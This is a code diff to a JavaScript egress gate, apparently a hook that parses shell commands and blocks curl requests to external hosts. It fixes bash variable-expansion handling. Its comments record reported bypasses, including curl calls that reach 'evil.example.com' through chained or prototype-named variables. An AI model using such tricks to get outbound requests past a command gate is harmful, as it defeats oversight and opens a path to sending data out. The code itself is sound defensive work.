@@ -250,13 +250,55 @@ export function isExternal(url) {
 // The name tables (env, loops) have NO prototype (card f2a0f976, Viktor 43009 LOW 1): on a plain object
 // `env['__proto__'] = url` set the prototype instead of a key, so `__proto__=<url>; curl -s $__proto__` read an
 // unset variable and passed, while bash expands it like any other name.
-function collectAssignments(r) {
+// Card c20467d6 (Viktor 43231 LOW): a value is expanded when it is assigned, in text order, as bash does. Before, the
+// value was stored as written, and expand() runs one pass, so `V=evil.example.com; U=$V; curl -s $U/p` reached curl as
+// `$V/p`: a bare name from the environment, unread, and the call passed while bash sent it to the external host. The
+// lookup is this command's earlier assignments over the enclosing env (`outer`). A loop variable of this command is
+// left as written from its loop head on (one of an enclosing command, `outerLoops`, from the start): it is set in the
+// loop body, so neither its earlier value nor a default word is what the body reads; the loop readings fill it as
+// before. An assignment to it after the head is its value again. A value whose
+// expansion could grow past its own text by more than MAX_EXPANDED_GROWTH (`A=$B$B`, doubled again and again) is not
+// built: it becomes UNREAD_VALUE, an operator form, so in a curl host it is an unresolved destination
+// (curlOperatorHost), and the size of what is read stays that of the command text.
+const MAX_EXPANDED_GROWTH = 8192
+const UNREAD_VALUE = '${EGRESS_GATE_UNREAD_VALUE%}'
+const LOOP_HEAD = (ws, k) => ws[k].text === 'for' && !ws[k].quoted && /^[A-Za-z_][A-Za-z0-9_]*$/.test(ws[k + 1]?.text ?? '') &&
+  !ws[k + 1].quoted && ws[k + 2]?.text === 'in' && !ws[k + 2].quoted
+function collectAssignments(r, outer = null, outerLoops = null) {
   const env = Object.create(null)
+  const loopNames = new Set(outerLoops ? Object.keys(outerLoops) : [])
+  // the lookup: own values over the enclosing ones; a loop variable is shadowed as unset from its loop head on (an
+  // enclosing one from the start), and an assignment after the head sets it again, in text order
+  const scope = Object.create(outer)
+  for (const v of loopNames) scope[v] = undefined
   for (const ws of r.segWords) {
-    for (const w of ws) {
+    for (const [k, w] of ws.entries()) {
+      if (LOOP_HEAD(ws, k)) { loopNames.add(ws[k + 1].text); scope[ws[k + 1].text] = undefined }
       const m = /^[A-Za-z_][A-Za-z0-9_]*=/.exec(w.text)
       if (!m || !/^c+$/.test(r.lxB.cls.slice(w.start, w.start + m[0].length))) continue
-      env[m[0].slice(0, -1)] = w.text.slice(m[0].length)
+      const name = m[0].slice(0, -1)
+      const raw = w.text.slice(m[0].length)
+      let value = raw
+      // A quoted or escaped $ ('$V', \$V, $'\x24V') is a literal, the word text no longer shows which is which: a value
+      // with only literal ones keeps its text, as before; one with both kinds (`"$V"'$x'`) is not read (unresolved).
+      let literal = 0
+      let live = 0
+      for (let k = w.start + m[0].length; k < w.end; k++) {
+        if (r.blankCp[k] !== '$') continue
+        const c = r.lxB.cls[k]
+        if (c === 'c' || c === 'd') live++
+        else if (!(c === 'a' && r.blankCp[k + 1] === "'" && r.lxB.cls[k + 1] === 'a')) literal++ // not a $'...' opener
+      }
+      if (literal && live) value = UNREAD_VALUE
+      else if (live && raw.includes('$')) {
+        // an upper bound of the expansion: every $NAME gives at most its value (a default word's own names are
+        // counted where they stand)
+        let bound = raw.length
+        for (const x of raw.matchAll(/\$\{?([A-Za-z_][A-Za-z0-9_]*)/g)) bound += scope[x[1]]?.length ?? 0
+        value = bound - raw.length > MAX_EXPANDED_GROWTH ? UNREAD_VALUE : expand(raw, scope, loopNames)
+      }
+      env[name] = value
+      scope[name] = value
     }
   }
   return env
@@ -269,8 +311,7 @@ function collectAssignments(r) {
 function collectLoops(r, env) {
   const loops = Object.create(null)
   for (const ws of r.segWords) {
-    const at = ws.findIndex((w, k) => w.text === 'for' && !w.quoted && /^[A-Za-z_][A-Za-z0-9_]*$/.test(ws[k + 1]?.text ?? '') &&
-      !ws[k + 1].quoted && ws[k + 2]?.text === 'in' && !ws[k + 2].quoted)
+    const at = ws.findIndex((_, k) => LOOP_HEAD(ws, k))
     if (at === -1) continue
     const vals = ws.slice(at + 3).flatMap((w) => {
       const v = expand(w.text, env)
@@ -867,7 +908,7 @@ function classifyRead(command, depth, vendorHosts, vendorDomains, scope) {
   // command (12 000 `vN=$(echo a); ` took 14-17 s, past the hook's timeout, which allows). env is only ever looked up by
   // name (expand), so a frame's own assignments go on a layer over the enclosing env; loops is read by key order
   // (loopVariants), so it is copied only when the frame has loops of its own.
-  const own = collectAssignments(r)
+  const own = collectAssignments(r, outer.env, outer.loops)
   const env = Object.keys(own).length ? Object.assign(Object.create(outer.env), own) : outer.env
   const ownLoops = Object.entries(collectLoops(r, env))
   const loops = ownLoops.length ? Object.assign(Object.create(null), outer.loops) : outer.loops
